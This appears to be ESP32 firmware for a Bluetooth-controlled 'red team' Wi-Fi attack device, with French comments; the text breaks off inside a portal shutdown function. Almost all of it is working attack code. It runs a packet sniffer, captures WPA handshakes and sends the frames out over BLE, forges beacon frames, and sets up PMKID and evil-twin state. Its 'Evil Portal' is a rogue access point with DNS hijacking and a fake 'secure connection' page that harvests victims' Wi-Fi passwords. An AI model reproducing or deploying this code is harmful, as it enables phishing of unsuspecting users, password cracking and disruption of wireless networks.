// ============================================================
//  RED ESP32 — BLE Red Team Controller
//  espressif32@3.5.0 + ArduinoJson v5
// ============================================================
#include <Arduino.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_err.h>
#include <esp_timer.h>
#include <esp_task_wdt.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/queue.h>
#include <lwip/sockets.h>
#include <lwip/netdb.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "config.h"

// FIX 1 — extern C correct
extern "C" {
    #include "esp_wifi_internal.h"
    esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx,
                                 const void *buffer,
                                 int len,
                                 bool en_sys_seq);
}

// ============================================================
//  Structures
// ============================================================
struct AccessPoint {
    uint8_t  bssid[6];
    char     ssid[33];
    int8_t   rssi;
    uint8_t  channel;
    uint32_t beacon_count;
    bool     active;
};

struct WifiStation {
    uint8_t  mac[6];
    uint8_t  bssid[6];
    int8_t   rssi;
    uint32_t pkt_count;
    uint32_t data_count;
    bool     active;
};

struct ProbeReq {
    uint8_t mac[6];
    char    ssid[33];
    int8_t  rssi;
    uint32_t count;
    bool    active;
};

struct NetEvent {
    uint8_t  type;
    uint8_t  bssid[6];
    uint8_t  mac[6];
    char     ssid[33];
    int8_t   rssi;
    uint8_t  channel;
    uint32_t timestamp;
};

struct CapturedFrame {
    uint8_t  data[FRAME_MAX_SIZE];
    uint16_t len;
    uint8_t  frame_type;
    uint8_t  bssid[6];
    uint8_t  station[6];
    char     ssid[33];
    uint8_t  channel;
    uint32_t timestamp;
};

struct BeaconEntry {
    char    ssid[33];
    uint8_t bssid[6];
    bool    in_use;
};

struct PortalCred {
    char url[128];
    char username[64];
    char password[64];
    bool in_use;
};

struct KarmaEntry {
    char    ssid[33];
    uint8_t bssid[6];
    int8_t  rssi;
    bool    active;
};

// ============================================================
//  BLE globals
// ============================================================
BLEServer         *pServer       = nullptr;
BLECharacteristic *pCmdChar      = nullptr;
BLECharacteristic *pRspChar      = nullptr;
bool               deviceConnected    = false;
bool               oldDeviceConnected = false;
bool               authenticated      = false;
int                authAttempts       = 0;
unsigned long      authStart          = 0;
portMUX_TYPE       notifyMux = portMUX_INITIALIZER_UNLOCKED;

// ============================================================
//  Sniffer globals
// ============================================================
#define MAX_APS      20
#define MAX_STATIONS 20
#define MAX_PROBES   20
#define MAX_EVENTS   20

AccessPoint  aps[MAX_APS];
int          apCount      = 0;
WifiStation  stations[MAX_STATIONS];
int          staCount     = 0;
ProbeReq     probes[MAX_PROBES];
int          probeCount   = 0;
NetEvent     events[MAX_EVENTS];
int          eventCount   = 0;

volatile uint32_t snifMgmt  = 0;
volatile uint32_t snifData  = 0;
volatile uint32_t snifCtrl  = 0;
bool              snifActive = false;
uint8_t           snifChan  = 1;
uint8_t           snifFilterBSSID[6] = {0};
bool              snifHasFilter = false;
unsigned long     snifStart = 0;

// ============================================================
//  Handshake globals
// ============================================================
CapturedFrame hsFrames[FRAME_MAX_COUNT];
int           hsFrameCount  = 0;
int           hsEapolCount  = 0;
int           hsBeaconCount = 0;
int           hsAuthCount   = 0;
int           hsAssocCount  = 0;
bool          hsM1 = false, hsM2 = false;
bool          hsM3 = false, hsM4 = false;
bool          hsActive  = false;
uint8_t       hsBSSID[6] = {0};
uint8_t       hsChannel  = 1;
unsigned long hsStart    = 0;

// ============================================================
//  Beacon spam globals
// ============================================================
BeaconEntry  beacons[MAX_BEACONS];
int          beaconCount   = 0;
bool         beaconActive  = false;
int          beaconChannel = 1;
int          beaconIdx     = 0;
unsigned long beaconLast   = 0;

// ============================================================
//  Evil Portal globals
// ============================================================
bool         portalActive  = false;
int          portalChannel = 6;
TaskHandle_t portalDnsTask = nullptr;
TaskHandle_t portalHttpTask= nullptr;
PortalCred   portalCreds[PORTAL_CRED_BUF_SIZE];
int          portalCredCount = 0;

// FIX 6 — HTML sans PROGMEM pour éviter strlen crash
// SSID injecte dynamiquement dans la page
static char portalSSID[33] = "Free_WiFi";

static const char PORTAL_HTML_TPL[] =
"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>WiFi</title>"
"<style>"
"*{margin:0;padding:0;box-sizing:border-box}"
"body{background:#1a1a2e;display:flex;justify-content:center;"
"align-items:center;min-height:100vh;font-family:-apple-system,system-ui,sans-serif}"
".card{background:#16213e;border-radius:16px;padding:40px 32px;width:92%%;"
"max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,.3)}"
".icon{text-align:center;font-size:56px;margin-bottom:16px}"
".ssid{text-align:center;color:#e94560;font-size:22px;font-weight:700;"
"margin-bottom:8px}"
".sub{text-align:center;color:#a0a0b0;font-size:13px;margin-bottom:28px}"
"input{width:100%%;padding:14px 16px;margin-bottom:16px;"
"border:2px solid #0f3460;border-radius:10px;font-size:16px;"
"background:#1a1a2e;color:#fff;outline:none;box-sizing:border-box}"
"input:focus{border-color:#e94560}"
"input::placeholder{color:#666}"
"button{width:100%%;padding:14px;background:#e94560;color:#fff;"
"border:none;border-radius:10px;font-size:17px;font-weight:700;"
"cursor:pointer;letter-spacing:.5px}"
"button:active{background:#c73553}"
".footer{text-align:center;color:#444;font-size:11px;margin-top:20px}"
"</style></head><body>"
"<div class='card'>"
"<div class='icon'>&#128274;</div>"
"<div class='ssid'>%s</div>"
"<div class='sub'>Entrez le mot de passe WiFi pour vous connecter</div>"
"<form method='post' action='/login'>"
"<input type='password' name='password' placeholder='Mot de passe WiFi' "
"autofocus required minlength='8'>"
"<button type='submit'>Se connecter</button>"
"</form>"
"<div class='footer'>Connexion securisee</div>"
"</div></body></html>";

static const char PORTAL_SUCCESS[] =
"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<meta http-equiv='refresh' content='5;url=/'>"
"<title>Connexion...</title>"
"<style>"
"body{background:#1a1a2e;display:flex;justify-content:center;"
"align-items:center;min-height:100vh;font-family:system-ui}"
".c{text-align:center;background:#16213e;padding:40px;border-radius:16px;"
"box-shadow:0 8px 32px rgba(0,0,0,.3);color:#fff;width:90%%;max-width:380px}"
".spin{border:4px solid #0f3460;border-top:4px solid #e94560;"
"border-radius:50%%;width:44px;height:44px;"
"animation:s 1s linear infinite;margin:0 auto 20px}"
"@keyframes s{to{transform:rotate(360deg)}}"
"h2{margin-bottom:8px;color:#e94560}"
"p{color:#a0a0b0;font-size:14px}"
"</style></head><body>"
"<div class='c'><div class='spin'></div>"
"<h2>Verification...</h2>"
"<p>Connexion au reseau en cours.<br>Veuillez patienter.</p>"
"</div></body></html>";

// ============================================================
//  Karma globals
// ============================================================
KarmaEntry   karmaEntries[KARMA_MAX_SSIDS];
int          karmaCount   = 0;
bool         karmaActive  = false;
int          karmaChannel = 1;
unsigned long karmaLast   = 0;

// Queue karma — IRAM safe
struct KarmaProbe {
    uint8_t sta_mac[6];
    uint8_t bssid[6];
    char    ssid[33];
    int8_t  rssi;
    bool    valid;
};

#define KARMA_QUEUE_SIZE 10
static KarmaProbe        karmaQueue[KARMA_QUEUE_SIZE];
static volatile int      karmaQueueHead = 0;
static volatile int      karmaQueueTail = 0;


// ============================================================
//  Channel Hopping globals
// ============================================================
bool          hopActive   = false;
uint8_t       hopChannel  = 1;
unsigned long hopLast     = 0;
bool          hopReportSent = false;

// ============================================================
//  PMKID globals
// ============================================================
struct PmkidEntry {
    uint8_t bssid[6];
    uint8_t client[6];
    uint8_t pmkid[16];
    char    ssid[33];
    bool    valid;
};

#define MAX_PMKID 10
PmkidEntry    pmkids[MAX_PMKID];
int           pmkidCount  = 0;
bool          pmkidActive = false;
unsigned long pmkidStart  = 0;
uint8_t       pmkidBSSID[6] = {0};
bool          pmkidAllBSSID = false;

// ============================================================
//  Evil Twin globals
// ============================================================
bool          twinActive  = false;
char          twinSSID[33]= {0};
uint8_t       twinBSSID[6]= {0};
uint8_t       twinChannel = 6;
char          twinPass[64]= {0};

// ============================================================
//  Attack state
// ============================================================
bool attack_running = false;
char current_attack[32] = {0};

// ============================================================
//  BLE Send
// ============================================================
void bleSend(const char *data, int len) {
    if (!deviceConnected || pRspChar == nullptr) return;
    portENTER_CRITICAL(&notifyMux);
    bool busy = false;
    portEXIT_CRITICAL(&notifyMux);
    if (busy) return;

    int offset = 0;
    while (offset < len) {
        int sz = min(BLE_CHUNK_SIZE, len - offset);
        pRspChar->setValue((uint8_t*)(data + offset), sz);
        pRspChar->notify();
        offset += sz;
        if (offset < len) delay(BLE_CHUNK_DELAY_MS);
    }
}

void bleSendStr(const String &s) {
    bleSend(s.c_str(), s.length());
}

void bleNotify(const char *status, const char *msg) {
    StaticJsonBuffer<256> jb;
    JsonObject &r = jb.createObject();
    r["status"]  = status;
    if (msg) r["message"] = msg;
    String o; r.printTo(o); bleSendStr(o);
}

// ============================================================
//  Helpers
// ============================================================
void parseMac(const char *s, uint8_t *mac) {
    int v[6] = {0};
    sscanf(s, "%x:%x:%x:%x:%x:%x",
           &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]);
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
}

String macToStr(const uint8_t *mac) {
    char buf[18];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    return String(buf);
}

bool macMatch(const uint8_t *a, const uint8_t *b) {
    return memcmp(a, b, 6) == 0;
}

bool macIsZero(const uint8_t *mac) {
    for (int i = 0; i < 6; i++) if (mac[i]) return false;
    return true;
}

bool macIsBcast(const uint8_t *mac) {
    return mac[0]==0xFF && mac[1]==0xFF && mac[2]==0xFF &&
           mac[3]==0xFF && mac[4]==0xFF && mac[5]==0xFF;
}

void randomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

void randomSSID(char *ssid, int len) {
    const char cs[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < len; i++)
        ssid[i] = cs[esp_random() % (sizeof(cs)-1)];
    ssid[len] = '\0';
}

// ============================================================
//  WiFi Scan
// ============================================================
void doScan() {
    int n = WiFi.scanNetworks(false, true);
    DynamicJsonBuffer jb;
    JsonObject &root    = jb.createObject();
    root["status"]      = "ok";
    root["cmd"]         = "scan";
    root["count"]       = n;
    JsonArray &nets     = root.createNestedArray("networks");
    for (int i = 0; i < n && i < MAX_SCAN_RESULTS; i++) {
        JsonObject &net = nets.createNestedObject();
        net["id"]       = i;
        net["ssid"]     = WiFi.SSID(i);
        net["bssid"]    = WiFi.BSSIDstr(i);
        net["rssi"]     = WiFi.RSSI(i);
        net["channel"]  = WiFi.channel(i);
        net["enc"]      = (int)WiFi.encryptionType(i);
    }
    String o; root.printTo(o); bleSendStr(o);
    WiFi.scanDelete();
}

// ============================================================
//  Sniffer CB
// ============================================================
static void IRAM_ATTR snifferCB(void *buf,
                                 wifi_promiscuous_pkt_type_t type) {
    if (!snifActive) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t  *data = pkt->payload;
    uint16_t  len  = pkt->rx_ctrl.sig_len;
    int8_t    rssi = pkt->rx_ctrl.rssi;
    uint8_t   ch   = pkt->rx_ctrl.channel;

    if (type == WIFI_PKT_CTRL) { snifCtrl++; return; }
    if (type == WIFI_PKT_MGMT) snifMgmt++;
    if (type == WIFI_PKT_DATA) snifData++;
    if (len < 10) return;

    uint8_t ft = data[0] & 0xFC;
    uint8_t *a1 = &data[4];
    uint8_t *a2 = (len>10) ? &data[10] : nullptr;
    uint8_t *a3 = (len>16) ? &data[16] : nullptr;

    if (snifHasFilter && a3) {
        if (!macMatch(a1,snifFilterBSSID) &&
            !(a2&&macMatch(a2,snifFilterBSSID)) &&
            !macMatch(a3,snifFilterBSSID)) return;
    }

    // Beacon
    if (ft==0x80 && len>36 && a3) {
        char ssid[33]={0};
        int p=36;
        while(p<(int)len-2){
            uint8_t eid=data[p],elen=data[p+1];
            if(p+2+elen>(int)len) break;
            if(eid==0&&elen>0&&elen<=32){
                memcpy(ssid,&data[p+2],elen);ssid[elen]='\0';break;
            }
            p+=2+elen; if(!elen) break;
        }
        bool found=false;
        for(int i=0;i<apCount;i++){
            if(macMatch(aps[i].bssid,a3)){
                aps[i].rssi=rssi;aps[i].beacon_count++;
                aps[i].channel=ch;found=true;break;
            }
        }
        if(!found&&apCount<MAX_APS){
            int idx=apCount++;
            memcpy(aps[idx].bssid,a3,6);
            strncpy(aps[idx].ssid,ssid,32);
            aps[idx].rssi=rssi;aps[idx].channel=ch;
            aps[idx].beacon_count=1;aps[idx].active=true;
            if(eventCount<MAX_EVENTS){
                NetEvent *ev=&events[eventCount++];
                ev->type=0;memcpy(ev->bssid,a3,6);
                memset(ev->mac,0,6);strncpy(ev->ssid,ssid,32);
                ev->rssi=rssi;ev->channel=ch;ev->timestamp=millis();
            }
        }
        return;
    }

    // Probe Request
    if(ft==0x40&&len>24&&a2){
        char ssid[33]={0};
        int p=24;
        while(p<(int)len-2){
            uint8_t eid=data[p],elen=data[p+1];
            if(p+2+elen>(int)len) break;
            if(eid==0&&elen>0&&elen<=32){
                memcpy(ssid,&data[p+2],elen);ssid[elen]='\0';break;
            }
            p+=2+elen; if(!elen) break;
        }
        bool found=false;
        for(int i=0;i<probeCount;i++){
            if(macMatch(probes[i].mac,a2)&&
               strcmp(probes[i].ssid,ssid)==0){
                probes[i].rssi=rssi;probes[i].count++;
                found=true;break;
            }
        }
        if(!found&&probeCount<MAX_PROBES&&ssid[0]){
            int idx=probeCount++;
            memcpy(probes[idx].mac,a2,6);
            strncpy(probes[idx].ssid,ssid,32);
            probes[idx].rssi=rssi;probes[idx].count=1;
            probes[idx].active=true;
        }
        return;
    }

    // Data
    if(type==WIFI_PKT_DATA&&a2&&a3){
        if(!macIsBcast(a2)&&!macIsZero(a2)){
            bool found=false;
            for(int i=0;i<staCount;i++){
                if(macMatch(stations[i].mac,a2)){
                    stations[i].rssi=rssi;
                    stations[i].pkt_count++;
                    stations[i].data_count++;
                    found=true;break;
                }
            }
            if(!found&&staCount<MAX_STATIONS){
                int idx=staCount++;
                memcpy(stations[idx].mac,a2,6);
                memcpy(stations[idx].bssid,a3,6);
                stations[idx].rssi=rssi;
                stations[idx].pkt_count=1;
                stations[idx].data_count=1;
                stations[idx].active=true;
                if(eventCount<MAX_EVENTS){
                    NetEvent *ev=&events[eventCount++];
                    ev->type=1;memcpy(ev->bssid,a3,6);
                    memcpy(ev->mac,a2,6);ev->ssid[0]='\0';
                    ev->rssi=rssi;ev->channel=ch;
                    ev->timestamp=millis();
                }
            }
        }
    }
}

void stopSniffer() {
    snifActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
}

// FIX 3 — sendSnifferReport avec reset des indices
void sendSnifferReport() {
    // Stats
    {
        StaticJsonBuffer<512> jb;
        JsonObject &r=jb.createObject();
        r["status"]="report"; r["section"]="stats";
        r["total"]=snifMgmt+snifData+snifCtrl;
        r["mgmt"]=snifMgmt; r["data"]=snifData;
        r["ctrl"]=snifCtrl;
        r["aps"]=apCount; r["clients"]=staCount;
        r["probes"]=probeCount;
        r["duration_s"]=(millis()-snifStart)/1000;
        String o; r.printTo(o); bleSendStr(o);
        delay(50);
    }
    // APs
    for(int i=0;i<apCount;i++){
        StaticJsonBuffer<256> jb;
        JsonObject &r=jb.createObject();
        r["status"]="report"; r["section"]="ap";
        r["bssid"]=macToStr(aps[i].bssid);
        r["ssid"]=aps[i].ssid[0]?aps[i].ssid:"(hidden)";
        r["rssi"]=(int)aps[i].rssi;
        r["channel"]=(int)aps[i].channel;
        r["beacons"]=aps[i].beacon_count;
        String o; r.printTo(o); bleSendStr(o);
        delay(30);
    }
    // Stations
    for(int i=0;i<staCount;i++){
        StaticJsonBuffer<256> jb;
        JsonObject &r=jb.createObject();
        r["status"]="report"; r["section"]="client";
        r["mac"]=macToStr(stations[i].mac);
        r["ap"]=macToStr(stations[i].bssid);
        r["rssi"]=(int)stations[i].rssi;
        r["pkts"]=stations[i].pkt_count;
        r["data"]=stations[i].data_count;
        String o; r.printTo(o); bleSendStr(o);
        delay(30);
    }
    // Probes
    for(int i=0;i<probeCount;i++){
        StaticJsonBuffer<256> jb;
        JsonObject &r=jb.createObject();
        r["status"]="report"; r["section"]="probe";
        r["mac"]=macToStr(probes[i].mac);
        r["ssid"]=probes[i].ssid;
        r["rssi"]=(int)probes[i].rssi;
        r["count"]=probes[i].count;
        String o; r.printTo(o); bleSendStr(o);
        delay(30);
    }
    // Events
    for(int i=0;i<eventCount;i++){
        StaticJsonBuffer<256> jb;
        JsonObject &r=jb.createObject();
        r["status"]="report"; r["section"]="event";
        r["type"]=events[i].type==0?"new_ap":"new_client";
        r["bssid"]=macToStr(events[i].bssid);
        r["mac"]=macToStr(events[i].mac);
        r["ssid"]=events[i].ssid;
        r["channel"]=(int)events[i].channel;
        String o; r.printTo(o); bleSendStr(o);
        delay(30);
    }
    // Complete
    {
        StaticJsonBuffer<128> jb;
        JsonObject &r=jb.createObject();
        r["status"]="report_complete";
        r["aps"]=apCount; r["clients"]=staCount;
        r["probes"]=probeCount; r["events"]=eventCount;
        String o; r.printTo(o); bleSendStr(o);
    }
}

// ============================================================
//  Handshake CB
// ============================================================
static void IRAM_ATTR handshakeCB(void *buf,
                                   wifi_promiscuous_pkt_type_t type) {
    if (!hsActive) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t  *data = pkt->payload;
    uint16_t  len  = pkt->rx_ctrl.sig_len;
    uint8_t   ch   = pkt->rx_ctrl.channel;

    if (len < 10 || len > FRAME_MAX_SIZE) return;

    uint8_t ft = data[0] & 0xFC;
    uint8_t *a1 = &data[4];
    uint8_t *a2 = (len>10)?&data[10]:nullptr;
    uint8_t *a3 = (len>16)?&data[16]:nullptr;

    // Vérifier que la frame concerne notre BSSID
    bool rel = false;
    if (a3 && macMatch(a3,hsBSSID)) rel=true;
    if (a1 && macMatch(a1,hsBSSID)) rel=true;
    if (a2 && macMatch(a2,hsBSSID)) rel=true;
    if (!rel) return;

    // EAPOL en priorité absolue
    if (type == WIFI_PKT_DATA) {
        for (int i=0; i<(int)len-1; i++) {
            if (data[i]==0x88 && data[i+1]==0x8E) {
                if (hsEapolCount < MAX_EAPOL_FRAMES &&
                    hsFrameCount < FRAME_MAX_COUNT) {
                    // Déterminer M1/M2/M3/M4
                    int eapol_off = i+2;
                    if (eapol_off+7 < (int)len) {
                        uint8_t eapol_type = data[eapol_off+1];
                        if (eapol_type == 3) {
                            uint16_t ki = (data[eapol_off+5]<<8)|
                                           data[eapol_off+6];
                            bool mic = ki & 0x0100;
                            bool ack = ki & 0x0080;
                            bool ins = ki & 0x0040;
                            bool sec = ki & 0x0200;
                            int mn = 0;
                            if (!mic&&ack&&!ins&&!sec) mn=1;
                            else if (mic&&!ack&&!ins&&!sec) mn=2;
                            else if (mic&&ack&&ins&&sec) mn=3;
                            else if (mic&&!ack&&ins&&sec) mn=4;
                            bool store = false;
                            if (mn==1&&!hsM1){hsM1=true;store=true;}
                            if (mn==2&&!hsM2){hsM2=true;store=true;}
                            if (mn==3&&!hsM3){hsM3=true;store=true;}
                            if (mn==4&&!hsM4){hsM4=true;store=true;}
                            if (store||mn==0) {
                                CapturedFrame *cf=&hsFrames[hsFrameCount++];
                                memcpy(cf->data,data,len);
                                cf->len=len; cf->frame_type=3;
                                if(a3) memcpy(cf->bssid,a3,6);
                                if(a2) memcpy(cf->station,a2,6);
                                cf->channel=ch;
                                cf->timestamp=millis();
                                hsEapolCount++;
                            }
                        }
                    }
                }
                return;
            }
        }
    }

    // Beacon
    if (ft==0x80 && hsBeaconCount<MAX_BEACON_STORE &&
        hsFrameCount<FRAME_MAX_COUNT) {
        CapturedFrame *cf=&hsFrames[hsFrameCount++];
        memcpy(cf->data,data,len);
        cf->len=len; cf->frame_type=0;
        if(a3) memcpy(cf->bssid,a3,6);
        memset(cf->station,0,6);
        cf->channel=ch; cf->timestamp=millis();
        // Extraire SSID du beacon
        int p=36;
        while(p<(int)len-2){
            uint8_t eid=data[p],elen=data[p+1];
            if(p+2+elen>(int)len) break;
            if(eid==0&&elen>0&&elen<=32){
                memcpy(cf->ssid,&data[p+2],elen);
                cf->ssid[elen]='\0'; break;
            }
            p+=2+elen; if(!elen) break;
        }
        hsBeaconCount++;
        return;
    }

    // Auth
    if (ft==0xB0 && hsAuthCount<MAX_AUTH_STORE &&
        hsFrameCount<FRAME_MAX_COUNT) {
        CapturedFrame *cf=&hsFrames[hsFrameCount++];
        memcpy(cf->data,data,len);
        cf->len=len; cf->frame_type=1;
        if(a3) memcpy(cf->bssid,a3,6);
        if(a2) memcpy(cf->station,a2,6);
        cf->channel=ch; cf->timestamp=millis();
        hsAuthCount++;
        return;
    }

    // Assoc
    if ((ft==0x00||ft==0x20) && hsAssocCount<MAX_ASSOC_STORE &&
        hsFrameCount<FRAME_MAX_COUNT) {
        CapturedFrame *cf=&hsFrames[hsFrameCount++];
        memcpy(cf->data,data,len);
        cf->len=len; cf->frame_type=2;
        if(a3) memcpy(cf->bssid,a3,6);
        if(a2) memcpy(cf->station,a2,6);
        cf->channel=ch; cf->timestamp=millis();
        hsAssocCount++;
    }
}

void stopHandshake() {
    hsActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
}

void sendCapturedFrames() {
    static const char b64t[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    for (int i=0; i<hsFrameCount; i++) {
        CapturedFrame *cf = &hsFrames[i];
        const char *tn = "other";
        if (cf->frame_type==0) tn="beacon";
        else if (cf->frame_type==1) tn="auth";
        else if (cf->frame_type==2) tn="assoc";
        else if (cf->frame_type==3) tn="eapol";

        {
            StaticJsonBuffer<256> jb;
            JsonObject &r=jb.createObject();
            r["status"]="capture_frame";
            r["index"]=i;
            r["total"]=hsFrameCount;
            r["type_name"]=tn;
            r["len"]=(int)cf->len;
            r["ts_ms"]=(int)(cf->timestamp-hsStart);
            String o; r.printTo(o); bleSendStr(o);
        }
        delay(60);

        // Base64 encode
        int dlen = cf->len;
        
        int chunkBytes = 180; // bytes par chunk (→ ~240 b64 chars)
        int totalChunks = (dlen + chunkBytes - 1) / chunkBytes;

        for (int c=0; c<totalChunks; c++) {
            int off = c * chunkBytes;
            int clen = min(chunkBytes, dlen - off);
            char b64buf[256];
            int bp = 0;
            for (int j=0; j<clen; j+=3) {
                uint32_t v = cf->data[off+j]<<16;
                if(j+1<clen) v|=cf->data[off+j+1]<<8;
                if(j+2<clen) v|=cf->data[off+j+2];
                b64buf[bp++]=b64t[(v>>18)&0x3F];
                b64buf[bp++]=b64t[(v>>12)&0x3F];
                b64buf[bp++]=(j+1<clen)?b64t[(v>>6)&0x3F]:'=';
                b64buf[bp++]=(j+2<clen)?b64t[v&0x3F]:'=';
            }
            b64buf[bp]='\0';

            StaticJsonBuffer<512> jb;
            JsonObject &r=jb.createObject();
            r["status"]="frame_data";
            r["index"]=i; r["chunk"]=c;
            r["total"]=totalChunks;
            r["data"]=b64buf;
            String o; r.printTo(o); bleSendStr(o);
            delay(40);
        }
    }

    {
        StaticJsonBuffer<256> jb;
        JsonObject &r=jb.createObject();
        r["status"]="transfer_complete";
        r["frames_sent"]=hsFrameCount;
        r["eapol_count"]=hsEapolCount;
        r["bssid"]=macToStr(hsBSSID);
        String o; r.printTo(o); bleSendStr(o);
    }
}

// ============================================================
//  Beacon Spam
// ============================================================
void buildBeaconFrame(uint8_t *frame, int *len,
                       const uint8_t *bssid,
                       const char *ssid, int ch) {
    int sl = strlen(ssid);
    if (sl > 32) sl = 32;
    int p = 0;
    frame[p++]=0x80; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x00;
    memset(frame+p,0xFF,6); p+=6;
    memcpy(frame+p,bssid,6); p+=6;
    memcpy(frame+p,bssid,6); p+=6;
    frame[p++]=0x00; frame[p++]=0x00;
    uint64_t ts=esp_timer_get_time();
    memcpy(frame+p,&ts,8); p+=8;
    frame[p++]=0x64; frame[p++]=0x00;
    frame[p++]=0x01; frame[p++]=0x04;
    frame[p++]=0x00; frame[p++]=(uint8_t)sl;
    memcpy(frame+p,ssid,sl); p+=sl;
    frame[p++]=0x01; frame[p++]=0x08;
    frame[p++]=0x82; frame[p++]=0x84;
    frame[p++]=0x8B; frame[p++]=0x96;
    frame[p++]=0x24; frame[p++]=0x30;
    frame[p++]=0x48; frame[p++]=0x6C;
    frame[p++]=0x03; frame[p++]=0x01;
    frame[p++]=(uint8_t)ch;
    *len = p;
}

void beaconTick() {
    if (!beaconActive) return;
    if (millis() - beaconLast < BEACON_SPAM_DELAY_MS) return;
    beaconLast = millis();
    if (beaconCount == 0) return;
    int idx = beaconIdx % beaconCount;
    uint8_t frame[128]; int flen=0;
    buildBeaconFrame(frame, &flen,
                     beacons[idx].bssid,
                     beacons[idx].ssid,
                     beaconChannel);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false);
    beaconIdx++;
}

void stopBeacon() {
    beaconActive = false;
    bleNotify("ok", "Beacon spam stopped");
}

// ============================================================
//  Evil Portal
// ============================================================

// FIX 4 — Portal sur AP séparé, BLE reste sur STA coexistence
// ESP32 supporte WIFI_MODE_APSTA pour AP+STA simultané

void portalCaptureCred(const char *url,
                        const char *user,
                        const char *pass) {
    if (portalCredCount >= PORTAL_CRED_BUF_SIZE) {
        // Décaler
        for (int i=1; i<PORTAL_CRED_BUF_SIZE; i++)
            memcpy(&portalCreds[i-1],&portalCreds[i],
                   sizeof(PortalCred));
        portalCredCount = PORTAL_CRED_BUF_SIZE - 1;
    }
    PortalCred *c = &portalCreds[portalCredCount++];
    strncpy(c->url,      url?url:"/",    127);
    strncpy(c->username, user?user:"",   63);
    strncpy(c->password, pass?pass:"",   63);
    c->in_use = true;

    StaticJsonBuffer<512> jb;
    JsonObject &r=jb.createObject();
    r["status"]="portal_cred";
    r["client_ip"]=c->url;
    r["ssid"]=c->username;
    r["password"]=c->password;
    String o; r.printTo(o); bleSendStr(o);
    Serial.printf("[PORTAL] CRED: %s / %s\n",
        c->username, c->password);
}

// ============================================================
//  Evil Portal — WebServer + DNSServer (stable)
// ============================================================
static WebServer   *portalWebServer = nullptr;
static DNSServer   *portalDNS       = nullptr;

static void portalHandleRoot() {
    char page[2048];
    snprintf(page, sizeof(page), PORTAL_HTML_TPL, portalSSID);
    portalWebServer->send(200, "text/html", page);
    Serial.println("[PORTAL] Page served");
}

static void portalHandleLogin() {
    String pass = "";
    if (portalWebServer->hasArg("password")) {
        pass = portalWebServer->arg("password");
    }

    // IP client
    String clientIP = portalWebServer->client().remoteIP().toString();

    Serial.printf("[PORTAL] Password: %s from %s\n",
        pass.c_str(), clientIP.c_str());

    portalCaptureCred(clientIP.c_str(), portalSSID, pass.c_str());

    portalWebServer->send(200, "text/html", PORTAL_SUCCESS);
}

static void portalHandleNotFound() {
    // Rediriger tout vers la page principale
    portalWebServer->sendHeader("Location", "http://192.168.4.1/");
    portalWebServer->send(302, "text/plain", "");
}

// Captive portal detection endpoints
static void portalHandleCaptive() {
    portalWebServer->sendHeader("Location", "http://192.168.4.1/");
    portalWebServer->send(302, "text/plain", "");
}

void startPortal(int channel, const char *ssid,
                 const char *pass) {
    if (portalActive) return;

    // Stocker le SSID
    strncpy(portalSSID, ssid, 32);
    portalSSID[32] = '\0';

    // Configurer AP
    WiFi.mode(WIFI_AP_STA);
    delay(100);

    if (pass && strlen(pass) >= 8) {
        WiFi.softAP(ssid, pass, channel, 0, PORTAL_MAX_CLIENTS);
    } else {
        WiFi.softAP(ssid, nullptr, channel, 0, PORTAL_MAX_CLIENTS);
    }

    IPAddress ip(192,168,4,1);
    IPAddress gw(192,168,4,1);
    IPAddress nm(255,255,255,0);
    WiFi.softAPConfig(ip, gw, nm);
    delay(300);

    // DNS — rediriger tout vers 192.168.4.1
    portalDNS = new DNSServer();
    portalDNS->setErrorReplyCode(DNSReplyCode::NoError);
    portalDNS->start(53, "*", ip);

    // WebServer
    portalWebServer = new WebServer(80);
    portalWebServer->on("/", HTTP_GET, portalHandleRoot);
    portalWebServer->on("/login", HTTP_POST, portalHandleLogin);

    // Captive portal detection
    portalWebServer->on("/generate_204", portalHandleCaptive);
    portalWebServer->on("/gen_204", portalHandleCaptive);
    portalWebServer->on("/hotspot-detect.html", portalHandleCaptive);
    portalWebServer->on("/canonical.html", portalHandleCaptive);
    portalWebServer->on("/success.txt", portalHandleCaptive);
    portalWebServer->on("/ncsi.txt", portalHandleCaptive);
    portalWebServer->on("/connecttest.txt", portalHandleCaptive);
    portalWebServer->on("/fwlink", portalHandleCaptive);

    portalWebServer->onNotFound(portalHandleNotFound);
    portalWebServer->begin();

    portalActive    = true;
    portalChannel   = channel;
    portalCredCount = 0;

    char msg[64];
    snprintf(msg, sizeof(msg),
             "Portal started SSID=%s ch=%d", ssid, channel);
    bleNotify("ok", msg);
    Serial.printf("[PORTAL] Started: %s ch=%d\n", ssid, channel);
}

void stopPortal() {
    if (!portalActive) return;
    portalActive = false;

    if (portalWebServer) {
        portalWebServer->stop();
        delete portalWebServer;
        portalWebServer = nullptr;
    }
    if (portalDNS) {
        portalDNS->stop();
        delete portalDNS;
        portalDNS = nullptr;
    }

    delay(200);
